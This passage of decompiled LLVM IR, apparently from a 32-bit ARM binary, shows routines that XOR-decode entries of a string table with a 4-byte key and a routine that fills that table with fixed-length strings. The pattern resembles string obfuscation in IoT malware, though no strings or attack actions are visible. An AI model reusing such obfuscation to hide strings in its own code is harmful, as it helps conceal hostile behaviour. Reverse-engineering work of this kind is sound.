  uselistorder i32 (i32, i32, i32)* @function_12fb4, { 3, 2, 5, 4, 11, 10, 9, 8, 7, 6, 1, 0 }
  uselistorder i32* @global_var_2297c.207, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_22978.205, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32* @global_var_223e8.194, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @function_15b1c, { 3, 5, 6, 4, 0, 1, 2, 7, 8, 9 }
  uselistorder i32* @global_var_2295c.90, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* @global_var_22980.192, { 0, 2, 1 }
  uselistorder i32 ()* @function_14c98, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %bb383, { 1, 0 }
  uselistorder label %dec_label_pc_119c0, { 1, 0 }
  uselistorder label %dec_label_pc_119b8, { 1, 0 }
  uselistorder label %dec_label_pc_11918, { 1, 0 }
  uselistorder label %dec_label_pc_11730, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11624, { 1, 0 }
  uselistorder label %dec_label_pc_11620, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_115e8, { 1, 0 }
  uselistorder label %dec_label_pc_115e4, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_115d4, { 1, 0 }
  uselistorder label %dec_label_pc_11560, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread96, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1152c, { 1, 0 }
  uselistorder label %.thread92, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1150c, { 1, 0 }
  uselistorder label %dec_label_pc_114f8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_114b4, { 1, 0 }
  uselistorder label %dec_label_pc_114b4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11470, { 1, 0 }
  uselistorder label %dec_label_pc_11400, { 7, 4, 5, 6, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_113d4, { 1, 0 }
  uselistorder label %dec_label_pc_11308, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_112f0, { 1, 0 }
  uselistorder label %dec_label_pc_11234, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1121c, { 1, 0 }
  uselistorder label %dec_label_pc_11160, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11148, { 1, 0 }
  uselistorder label %dec_label_pc_10f84, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10eb0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10e98, { 1, 0 }
  uselistorder label %dec_label_pc_10d7c, { 7, 8, 3, 4, 1, 0, 2, 5, 6 }
  uselistorder label %bb346, { 1, 0 }
  uselistorder label %bb344, { 1, 0 }
  uselistorder label %dec_label_pc_10cc4, { 1, 0 }
  uselistorder label %.thread50, { 1, 0 }
  uselistorder label %dec_label_pc_10c74, { 1, 0 }
  uselistorder label %dec_label_pc_10c64, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10c5cthread-pre-split.thread477, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10c5cthread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10c64.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10c58.loopexit, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10c40, { 1, 0 }
  uselistorder label %dec_label_pc_10b80, { 1, 0 }
  uselistorder label %bb340, { 1, 0 }
  uselistorder label %bb338, { 1, 0 }
  uselistorder label %bb336, { 1, 0 }
  uselistorder label %bb334, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10a74.dec_label_pc_10a74_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10a50.dec_label_pc_10a50_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10a44, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10a3c, { 1, 0 }
  uselistorder label %dec_label_pc_10a14, { 1, 0 }
  uselistorder label %dec_label_pc_109f0, { 1, 0 }
  uselistorder label %dec_label_pc_108a4, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_10898, { 1, 0 }
  uselistorder label %dec_label_pc_10728, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10704, { 1, 0 }
  uselistorder label %dec_label_pc_106f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_106d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_106b0, { 1, 0 }
  uselistorder label %bb312, { 1, 0 }
  uselistorder label %dec_label_pc_1065c, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_1012c, { 1, 0 }
}

define i32 @function_11a14(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11a14:
  store i32 ptrtoint (i32* @global_var_22988.341 to i32), i32* @r2, align 4
  %v3_11a18 = mul i32 %arg1, 8
  %v2_11a1c = add i32 %v3_11a18, ptrtoint (i32* @global_var_22988.341 to i32)
  %v2_11a20 = icmp eq i32* %arg2, null
  br i1 %v2_11a20, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11a14
  %v3_11a284 = inttoptr i32 %v2_11a1c to i32*
  %v4_11a285 = load i32, i32* %v3_11a284, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_11a14
  %v2_11a24 = add i32 %v3_11a18, add (i32 ptrtoint (i32* @global_var_22988.341 to i32), i32 4)
  %v3_11a24 = inttoptr i32 %v2_11a24 to i16*
  %v4_11a24 = load i16, i16* %v3_11a24, align 4
  %v5_11a24 = zext i16 %v4_11a24 to i32
  %v3_11a28 = inttoptr i32 %v2_11a1c to i32*
  %v4_11a28 = load i32, i32* %v3_11a28, align 4
  store i32 %v5_11a24, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_11a286 = phi i32 [ %v4_11a285, %.thread ], [ %v4_11a28, %bb ]
  ret i32 %v4_11a286

; uselistorder directives
  uselistorder i32 %v2_11a1c, { 1, 0 }
  uselistorder i32 %v3_11a18, { 1, 0 }
  uselistorder i32* null, { 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 1, 18, 21, 19, 20, 34, 22, 4, 23, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 33 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_11a38(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a38:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a40 = mul i32 %arg1, 8
  %v2_11a44 = add i32 %v3_11a40, ptrtoint (i32* @global_var_22988.341 to i32)
  %v2_11a48 = load i32, i32* @global_var_22344.344, align 4
  %v1_11a4c = add i32 %v3_11a40, add (i32 ptrtoint (i32* @global_var_22988.341 to i32), i32 4)
  %v2_11a4c = inttoptr i32 %v1_11a4c to i16*
  %v3_11a4c = load i16, i16* %v2_11a4c, align 4
  %v3_11a50 = udiv i32 %v2_11a48, 256
  %v2_11a54 = icmp eq i16 %v3_11a4c, 0
  %v3_11a58 = udiv i32 %v2_11a48, 65536
  %v3_11a5c = load i32, i32* @r4, align 4
  store i32 %v3_11a5c, i32* %stack_var_-16, align 4
  %v1_11a60 = urem i32 %v3_11a50, 256
  store i32 %v1_11a60, i32* %r6.global-to-local, align 4
  %v1_11a64 = urem i32 %v3_11a58, 256
  store i32 %v1_11a64, i32* %r5.global-to-local, align 4
  %v3_11a68 = udiv i32 %v2_11a48, 16777216
  store i32 %v3_11a68, i32* %r4.global-to-local, align 4
  %v1_11a6c = urem i32 %v2_11a48, 256
  store i32 %v1_11a6c, i32* %lr.global-to-local, align 4
  br i1 %v2_11a54, label %dec_label_pc_11ac8, label %dec_label_pc_11a74

dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a38
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_11a78 = inttoptr i32 %v2_11a44 to i32*
  br label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a78.dec_label_pc_11a78_crit_edge, %dec_label_pc_11a74
  %v0_11a80 = phi i32 [ %v0_11a80.pre, %dec_label_pc_11a78.dec_label_pc_11a78_crit_edge ], [ %v1_11a6c, %dec_label_pc_11a74 ]
  %v2_11a84 = phi i32 [ %v1_11abc, %dec_label_pc_11a78.dec_label_pc_11a78_crit_edge ], [ 0, %dec_label_pc_11a74 ]
  %v2_11a78 = load i32, i32* %v1_11a78, align 4
  %v2_11a7c = add i32 %v2_11a78, %v2_11a84
  %v3_11a7c = inttoptr i32 %v2_11a7c to i8*
  %v4_11a7c = load i8, i8* %v3_11a7c, align 1
  %v6_11a7c = zext i8 %v4_11a7c to i32
  %v2_11a80 = xor i32 %v6_11a7c, %v0_11a80
  %v1_11a84 = trunc i32 %v2_11a80 to i8
  store i8 %v1_11a84, i8* %v3_11a7c, align 1
  %v2_11a88 = load i32, i32* %v1_11a78, align 4
  %v0_11a8c = load i32, i32* %ip.global-to-local, align 4
  %v2_11a8c = add i32 %v0_11a8c, %v2_11a88
  %v3_11a8c = inttoptr i32 %v2_11a8c to i8*
  %v4_11a8c = load i8, i8* %v3_11a8c, align 1
  %v6_11a8c = zext i8 %v4_11a8c to i32
  %v0_11a90 = load i32, i32* %r6.global-to-local, align 4
  %v2_11a90 = xor i32 %v0_11a90, %v6_11a8c
  %v1_11a94 = trunc i32 %v2_11a90 to i8
  store i8 %v1_11a94, i8* %v3_11a8c, align 1
  %v2_11a98 = load i32, i32* %v1_11a78, align 4
  %v0_11a9c = load i32, i32* %ip.global-to-local, align 4
  %v2_11a9c = add i32 %v0_11a9c, %v2_11a98
  %v3_11a9c = inttoptr i32 %v2_11a9c to i8*
  %v4_11a9c = load i8, i8* %v3_11a9c, align 1
  %v6_11a9c = zext i8 %v4_11a9c to i32
  %v0_11aa0 = load i32, i32* %r5.global-to-local, align 4
  %v2_11aa0 = xor i32 %v0_11aa0, %v6_11a9c
  %v1_11aa4 = trunc i32 %v2_11aa0 to i8
  store i8 %v1_11aa4, i8* %v3_11a9c, align 1
  %v2_11aa8 = load i32, i32* %v1_11a78, align 4
  %v0_11aac = load i32, i32* %ip.global-to-local, align 4
  %v2_11aac = add i32 %v0_11aac, %v2_11aa8
  %v3_11aac = inttoptr i32 %v2_11aac to i8*
  %v4_11aac = load i8, i8* %v3_11aac, align 1
  %v6_11aac = zext i8 %v4_11aac to i32
  %v0_11ab0 = load i32, i32* %r4.global-to-local, align 4
  %v2_11ab0 = xor i32 %v0_11ab0, %v6_11aac
  %v1_11ab4 = trunc i32 %v2_11ab0 to i8
  store i8 %v1_11ab4, i8* %v3_11aac, align 1
  %v3_11ab8 = load i16, i16* %v2_11a4c, align 4
  %v4_11ab8 = zext i16 %v3_11ab8 to i32
  %v0_11abc = load i32, i32* %ip.global-to-local, align 4
  %v1_11abc = add i32 %v0_11abc, 1
  store i32 %v1_11abc, i32* %ip.global-to-local, align 4
  %v8_11ac4 = icmp sgt i32 %v4_11ab8, %v1_11abc
  br i1 %v8_11ac4, label %dec_label_pc_11a78.dec_label_pc_11a78_crit_edge, label %dec_label_pc_11ac8.loopexit

dec_label_pc_11a78.dec_label_pc_11a78_crit_edge:  ; preds = %dec_label_pc_11a78
  %v0_11a80.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a78

dec_label_pc_11ac8.loopexit:                      ; preds = %dec_label_pc_11a78
  %v2_11ac8.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11ac8.loopexit, %dec_label_pc_11a38
  %v2_11ac8 = phi i32 [ %v2_11ac8.pre, %dec_label_pc_11ac8.loopexit ], [ %v3_11a5c, %dec_label_pc_11a38 ]
  store i32 %v2_11ac8, i32* @r4, align 4
  ret i32 %v2_11a44

; uselistorder directives
  uselistorder i32 %v1_11abc, { 1, 2, 0 }
  uselistorder i32 %v1_11a6c, { 1, 0 }
  uselistorder i32 %v2_11a48, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11a44, { 1, 0 }
  uselistorder i32 %v3_11a40, { 1, 0 }
}

define i32 @function_11ad8(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ad8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11ae0 = mul i32 %arg1, 8
  %v2_11ae4 = add i32 %v3_11ae0, ptrtoint (i32* @global_var_22988.341 to i32)
  %v2_11ae8 = load i32, i32* @global_var_22344.344, align 4
  %v1_11aec = add i32 %v3_11ae0, add (i32 ptrtoint (i32* @global_var_22988.341 to i32), i32 4)
  %v2_11aec = inttoptr i32 %v1_11aec to i16*
  %v3_11aec = load i16, i16* %v2_11aec, align 4
  %v3_11af0 = udiv i32 %v2_11ae8, 256
  store i32 %v3_11af0, i32* @r2, align 4
  %v2_11af4 = icmp eq i16 %v3_11aec, 0
  %v3_11af8 = udiv i32 %v2_11ae8, 65536
  %v3_11afc = load i32, i32* @r4, align 4
  store i32 %v3_11afc, i32* %stack_var_-16, align 4
  %v1_11b00 = urem i32 %v3_11af0, 256
  store i32 %v1_11b00, i32* %r6.global-to-local, align 4
  %v1_11b04 = urem i32 %v3_11af8, 256
  store i32 %v1_11b04, i32* %r5.global-to-local, align 4
  %v3_11b08 = udiv i32 %v2_11ae8, 16777216
  store i32 %v3_11b08, i32* %r4.global-to-local, align 4
  %v1_11b0c = urem i32 %v2_11ae8, 256
  store i32 %v1_11b0c, i32* %lr.global-to-local, align 4
  br i1 %v2_11af4, label %dec_label_pc_11b68, label %dec_label_pc_11b14

dec_label_pc_11b14:                               ; preds = %dec_label_pc_11ad8
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_11b18 = inttoptr i32 %v2_11ae4 to i32*
  br label %dec_label_pc_11b18

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11b18.dec_label_pc_11b18_crit_edge, %dec_label_pc_11b14
  %v0_11b20 = phi i32 [ %v0_11b20.pre, %dec_label_pc_11b18.dec_label_pc_11b18_crit_edge ], [ %v1_11b0c, %dec_label_pc_11b14 ]
  %v2_11b24 = phi i32 [ %v1_11b5c, %dec_label_pc_11b18.dec_label_pc_11b18_crit_edge ], [ 0, %dec_label_pc_11b14 ]
  %v2_11b18 = load i32, i32* %v1_11b18, align 4
  %v2_11b1c = add i32 %v2_11b18, %v2_11b24
  %v3_11b1c = inttoptr i32 %v2_11b1c to i8*
  %v4_11b1c = load i8, i8* %v3_11b1c, align 1
  %v6_11b1c = zext i8 %v4_11b1c to i32
  %v2_11b20 = xor i32 %v6_11b1c, %v0_11b20
  %v1_11b24 = trunc i32 %v2_11b20 to i8
  store i8 %v1_11b24, i8* %v3_11b1c, align 1
  %v2_11b28 = load i32, i32* %v1_11b18, align 4
  %v0_11b2c = load i32, i32* %ip.global-to-local, align 4
  %v2_11b2c = add i32 %v0_11b2c, %v2_11b28
  %v3_11b2c = inttoptr i32 %v2_11b2c to i8*
  %v4_11b2c = load i8, i8* %v3_11b2c, align 1
  %v6_11b2c = zext i8 %v4_11b2c to i32
  %v0_11b30 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b30 = xor i32 %v0_11b30, %v6_11b2c
  %v1_11b34 = trunc i32 %v2_11b30 to i8
  store i8 %v1_11b34, i8* %v3_11b2c, align 1
  %v2_11b38 = load i32, i32* %v1_11b18, align 4
  %v0_11b3c = load i32, i32* %ip.global-to-local, align 4
  %v2_11b3c = add i32 %v0_11b3c, %v2_11b38
  %v3_11b3c = inttoptr i32 %v2_11b3c to i8*
  %v4_11b3c = load i8, i8* %v3_11b3c, align 1
  %v6_11b3c = zext i8 %v4_11b3c to i32
  %v0_11b40 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b40 = xor i32 %v0_11b40, %v6_11b3c
  %v1_11b44 = trunc i32 %v2_11b40 to i8
  store i8 %v1_11b44, i8* %v3_11b3c, align 1
  %v2_11b48 = load i32, i32* %v1_11b18, align 4
  %v0_11b4c = load i32, i32* %ip.global-to-local, align 4
  %v2_11b4c = add i32 %v0_11b4c, %v2_11b48
  %v3_11b4c = inttoptr i32 %v2_11b4c to i8*
  %v4_11b4c = load i8, i8* %v3_11b4c, align 1
  %v6_11b4c = zext i8 %v4_11b4c to i32
  %v0_11b50 = load i32, i32* %r4.global-to-local, align 4
  %v2_11b50 = xor i32 %v0_11b50, %v6_11b4c
  %v1_11b54 = trunc i32 %v2_11b50 to i8
  store i8 %v1_11b54, i8* %v3_11b4c, align 1
  %v3_11b58 = load i16, i16* %v2_11aec, align 4
  %v4_11b58 = zext i16 %v3_11b58 to i32
  store i32 %v4_11b58, i32* @r2, align 4
  %v0_11b5c = load i32, i32* %ip.global-to-local, align 4
  %v1_11b5c = add i32 %v0_11b5c, 1
  store i32 %v1_11b5c, i32* %ip.global-to-local, align 4
  %v8_11b64 = icmp sgt i32 %v4_11b58, %v1_11b5c
  br i1 %v8_11b64, label %dec_label_pc_11b18.dec_label_pc_11b18_crit_edge, label %dec_label_pc_11b68.loopexit

dec_label_pc_11b18.dec_label_pc_11b18_crit_edge:  ; preds = %dec_label_pc_11b18
  %v0_11b20.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11b18

dec_label_pc_11b68.loopexit:                      ; preds = %dec_label_pc_11b18
  %v2_11b68.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11b68

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b68.loopexit, %dec_label_pc_11ad8
  %v2_11b68 = phi i32 [ %v2_11b68.pre, %dec_label_pc_11b68.loopexit ], [ %v3_11afc, %dec_label_pc_11ad8 ]
  store i32 %v2_11b68, i32* @r4, align 4
  ret i32 %v2_11ae4

; uselistorder directives
  uselistorder i32 %v1_11b5c, { 1, 2, 0 }
  uselistorder i32 %v1_11b0c, { 1, 0 }
  uselistorder i32 %v3_11af0, { 1, 0 }
  uselistorder i32 %v2_11ae8, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11ae4, { 1, 0 }
  uselistorder i32 %v3_11ae0, { 1, 0 }
}

define i32 @function_11b78() local_unnamed_addr {
dec_label_pc_11b78:
  %r5.global-to-local = alloca i32, align 4
  %v6_11b78 = load i32, i32* @r5, align 4
  store i32 18, i32* @r0, align 4
  %v0_11b84 = call i32 @function_13cc8()
  store i32 ptrtoint ([19 x i8]* @global_var_19a78.348 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22988.341 to i32), i32* @r4, align 4
  store i32 %v0_11b84, i32* @r5, align 4
  %v4_11b9c = call i32 @function_123e0(i32 %v0_11b84, i32 ptrtoint ([19 x i8]* @global_var_19a78.348 to i32), i32 18)
  store i32 2, i32* @r0, align 4
  %v0_11ba8 = load i32, i32* @r5, align 4
  store i32 %v0_11ba8, i32* @global_var_229a0.350, align 4
  store i16 18, i16* bitcast (i32* @global_var_229a4.351 to i16*), align 4
  %v0_11bb0 = call i32 @function_13cc8()
  store i32 2, i32* @r5, align 4
  store i32 %v0_11bb0, i32* @r6, align 4
  %v4_11bc4 = call i32 @function_123e0(i32 %v0_11bb0, i32 ptrtoint ([3 x i8]* @global_var_19a8c.353 to i32), i32 2)
  store i32 18, i32* @r0, align 4
  %v0_11bcc = load i32, i32* @r6, align 4
  store i32 %v0_11bcc, i32* @global_var_229a8.354, align 4
  %v0_11bd0 = load i32, i32* @r5, align 4
  %v1_11bd0 = trunc i32 %v0_11bd0 to i16
  store i16 %v1_11bd0, i16* bitcast (i32* @global_var_229ac.355 to i16*), align 4
  %v0_11bd4 = call i32 @function_13cc8()
  %v0_11bd8 = load i32, i32* @r7, align 4
  store i32 %v0_11bd4, i32* @r6, align 4
  %v4_11be4 = call i32 @function_123e0(i32 %v0_11bd4, i32 %v0_11bd8, i32 18)
  %v0_11bec = load i32, i32* @r5, align 4
  store i32 %v0_11bec, i32* @r0, align 4
  store i16 18, i16* bitcast (i32* @global_var_22a1c.356 to i16*), align 4
  %v0_11bf4 = load i32, i32* @r6, align 4
  store i32 %v0_11bf4, i32* @global_var_22a18.357, align 4
  %v0_11bf8 = call i32 @function_13cc8()
  %v0_11bfc = load i32, i32* @r5, align 4
  store i32 %v0_11bf8, i32* @r6, align 4
  %v3_11c08 = call i32 @function_123e0(i32 %v0_11bf8, i32 ptrtoint (i32* @global_var_19a90.359 to i32), i32 %v0_11bfc)
  store i32 15, i32* @r0, align 4
  %v0_11c10 = load i32, i32* @r6, align 4
  store i32 %v0_11c10, i32* @global_var_22a20.360, align 4
  %v0_11c14 = load i32, i32* @r5, align 4
  %v1_11c14 = trunc i32 %v0_11c14 to i16
  store i16 %v1_11c14, i16* bitcast (i32* @global_var_22a24.361 to i16*), align 4
  %v0_11c18 = call i32 @function_13cc8()
  store i32 %v0_11c18, i32* @r5, align 4
  %v3_11c28 = call i32 @function_123e0(i32 %v0_11c18, i32 ptrtoint (i32* @global_var_19a94.363 to i32), i32 15)
  store i32 29, i32* @r0, align 4
  %v0_11c34 = load i32, i32* @r5, align 4
  store i32 %v0_11c34, i32* @global_var_22998.364, align 4
  store i16 15, i16* bitcast (i32* @global_var_2299c.365 to i16*), align 4
  %v0_11c3c = call i32 @function_13cc8()
  store i32 %v0_11c3c, i32* @r5, align 4
  %v3_11c4c = call i32 @function_123e0(i32 %v0_11c3c, i32 ptrtoint (i32* @global_var_19aa4.367 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_229b4.368 to i16*), align 4
  %v0_11c5c = load i32, i32* @r5, align 4
  store i32 %v0_11c5c, i32* @global_var_229b0.369, align 4
  %v0_11c60 = call i32 @function_13cc8()
  store i32 7, i32* @r6, align 4
  store i32 %v0_11c60, i32* @r5, align 4
  %v4_11c74 = call i32 @function_123e0(i32 %v0_11c60, i32 ptrtoint ([8 x i8]* @global_var_19ac4.371 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_11c7c = load i32, i32* @r5, align 4
  store i32 %v0_11c7c, i32* @global_var_229b8.372, align 4
  %v0_11c80 = load i32, i32* @r6, align 4
  %v1_11c80 = trunc i32 %v0_11c80 to i16
  store i16 %v1_11c80, i16* bitcast (i32* @global_var_229bc.373 to i16*), align 4
  %v0_11c84 = call i32 @function_13cc8()
  store i32 %v0_11c84, i32* @r5, align 4
  %v4_11c94 = call i32 @function_123e0(i32 %v0_11c84, i32 ptrtoint ([6 x i8]* @global_var_19acc.375 to i32), i32 5)
  store i32 11, i32* @r0, align 4
  %v0_11ca0 = load i32, i32* @r5, align 4
  store i32 %v0_11ca0, i32* @global_var_229c0.376, align 4
  store i16 5, i16* bitcast (i32* @global_var_229c4.377 to i16*), align 4
  %v0_11ca8 = call i32 @function_13cc8()
  store i32 11, i32* @fp, align 4
  store i32 %v0_11ca8, i32* @r5, align 4
  %v3_11cbc = call i32 @function_123e0(i32 %v0_11ca8, i32 ptrtoint (i32* @global_var_19ad4.379 to i32), i32 11)
  store i32 4, i32* @r0, align 4
  %v0_11cc4 = load i32, i32* @r5, align 4
  store i32 %v0_11cc4, i32* @global_var_229c8.380, align 4
  %v0_11cc8 = load i32, i32* @fp, align 4
  %v1_11cc8 = trunc i32 %v0_11cc8 to i16
  store i16 %v1_11cc8, i16* bitcast (i32* @global_var_229cc.381 to i16*), align 4
  %v0_11ccc = call i32 @function_13cc8()
  store i32 %v0_11ccc, i32* @r5, align 4
  %v4_11cdc = call i32 @function_123e0(i32 %v0_11ccc, i32 ptrtoint ([5 x i8]* @global_var_19ae0.383 to i32), i32 4)
  %v0_11ce4 = load i32, i32* @r6, align 4
  store i32 %v0_11ce4, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_229d4.384 to i16*), align 4
  %v0_11cec = load i32, i32* @r5, align 4
  store i32 %v0_11cec, i32* @global_var_229d0.385, align 4
  %v0_11cf0 = call i32 @function_13cc8()
  %v0_11cf4 = load i32, i32* @r6, align 4
  store i32 %v0_11cf0, i32* @r5, align 4
  %v4_11d00 = call i32 @function_123e0(i32 %v0_11cf0, i32 ptrtoint ([8 x i8]* @global_var_19ae8.387 to i32), i32 %v0_11cf4)
  store i32 8, i32* @r0, align 4
  %v0_11d08 = load i32, i32* @r5, align 4
  store i32 %v0_11d08, i32* @global_var_229d8.388, align 4
  %v0_11d0c = load i32, i32* @r6, align 4
  %v1_11d0c = trunc i32 %v0_11d0c to i16
  store i16 %v1_11d0c, i16* bitcast (i32* @global_var_229dc.389 to i16*), align 4
  %v0_11d10 = call i32 @function_13cc8()
  store i32 8, i32* @sl, align 4
  store i32 %v0_11d10, i32* @r5, align 4
  %v4_11d24 = call i32 @function_123e0(i32 %v0_11d10, i32 ptrtoint ([9 x i8]* @global_var_19af0.391 to i32), i32 8)
  store i32 13, i32* @r0, align 4
  %v0_11d2c = load i32, i32* @r5, align 4
  store i32 %v0_11d2c, i32* @global_var_229e0.392, align 4
  %v0_11d30 = load i32, i32* @sl, align 4
  %v1_11d30 = trunc i32 %v0_11d30 to i16
  store i16 %v1_11d30, i16* bitcast (i32* @global_var_229e4.393 to i16*), align 4
  %v0_11d34 = call i32 @function_13cc8()
  store i32 %v0_11d34, i32* @r5, align 4
  %v3_11d44 = call i32 @function_123e0(i32 %v0_11d34, i32 ptrtoint (i32* @global_var_19afc.395 to i32), i32 13)
  store i32 10, i32* @r0, align 4
  store i32 10, i32* @r7, align 4
  %v0_11d54 = load i32, i32* @r5, align 4
  store i32 %v0_11d54, i32* @global_var_229e8.396, align 4
  store i16 13, i16* bitcast (i32* @global_var_229ec.397 to i16*), align 4
  %v0_11d5c = call i32 @function_13cc8()
  %v0_11d64 = load i32, i32* @r7, align 4
  store i32 %v0_11d5c, i32* @r5, align 4
  %v4_11d6c = call i32 @function_123e0(i32 %v0_11d5c, i32 ptrtoint ([11 x i8]* @global_var_19b0c.399 to i32), i32 %v0_11d64)
  %v0_11d70 = load i32, i32* @r7, align 4
  store i32 %v0_11d70, i32* @r0, align 4
  %v0_11d74 = load i32, i32* @r5, align 4
  store i32 %v0_11d74, i32* @global_var_229f0.400, align 4
  %v1_11d78 = trunc i32 %v0_11d70 to i16
  store i16 %v1_11d78, i16* bitcast (i32* @global_var_229f4.401 to i16*), align 4
  %v0_11d7c = call i32 @function_13cc8()
  %v0_11d84 = load i32, i32* @r7, align 4
  store i32 %v0_11d7c, i32* @r5, align 4
  %v4_11d8c = call i32 @function_123e0(i32 %v0_11d7c, i32 ptrtoint ([11 x i8]* @global_var_19b18.403 to i32), i32 %v0_11d84)
  store i32 33, i32* @r0, align 4
  %v0_11d94 = load i32, i32* @r5, align 4
  store i32 %v0_11d94, i32* @global_var_229f8.404, align 4
  %v0_11d98 = load i32, i32* @r7, align 4
  %v1_11d98 = trunc i32 %v0_11d98 to i16
  store i16 %v1_11d98, i16* bitcast (i32* @global_var_229fc.405 to i16*), align 4
  %v0_11d9c = call i32 @function_13cc8()
  store i32 %v0_11d9c, i32* @r5, align 4
  %v3_11dac = call i32 @function_123e0(i32 %v0_11d9c, i32 ptrtoint (i32* @global_var_19b24.407 to i32), i32 33)
  %v0_11db4 = load i32, i32* @sl, align 4
  store i32 %v0_11db4, i32* @r0, align 4
  store i16 33, i16* bitcast (i32* @global_var_22a04.408 to i16*), align 4
  %v0_11dbc = load i32, i32* @r5, align 4
  store i32 %v0_11dbc, i32* @global_var_22a00.409, align 4
  %v0_11dc0 = call i32 @function_13cc8()
  %v0_11dc8 = load i32, i32* @sl, align 4
  store i32 %v0_11dc0, i32* @r5, align 4
  %v4_11dd0 = call i32 @function_123e0(i32 %v0_11dc0, i32 ptrtoint ([9 x i8]* @global_var_19b48.411 to i32), i32 %v0_11dc8)
  %v0_11dd4 = load i32, i32* @fp, align 4
  store i32 %v0_11dd4, i32* @r0, align 4
  %v0_11dd8 = load i32, i32* @r5, align 4
  store i32 %v0_11dd8, i32* @global_var_22a08.412, align 4
  %v0_11ddc = load i32, i32* @sl, align 4
  %v1_11ddc = trunc i32 %v0_11ddc to i16
  store i16 %v1_11ddc, i16* bitcast (i32* @global_var_22a0c.413 to i16*), align 4
  %v0_11de0 = call i32 @function_13cc8()
  %v0_11de8 = load i32, i32* @fp, align 4
  store i32 %v0_11de0, i32* @r5, align 4
  %v4_11df0 = call i32 @function_123e0(i32 %v0_11de0, i32 ptrtoint ([12 x i8]* @global_var_19b54.415 to i32), i32 %v0_11de8)
  store i32 6, i32* @r0, align 4
  %v0_11df8 = load i32, i32* @r5, align 4
  store i32 %v0_11df8, i32* @global_var_22a10.416, align 4
  %v0_11dfc = load i32, i32* @fp, align 4
  %v1_11dfc = trunc i32 %v0_11dfc to i16
  store i16 %v1_11dfc, i16* bitcast (i32* @global_var_22a14.417 to i16*), align 4
  %v0_11e00 = call i32 @function_13cc8()
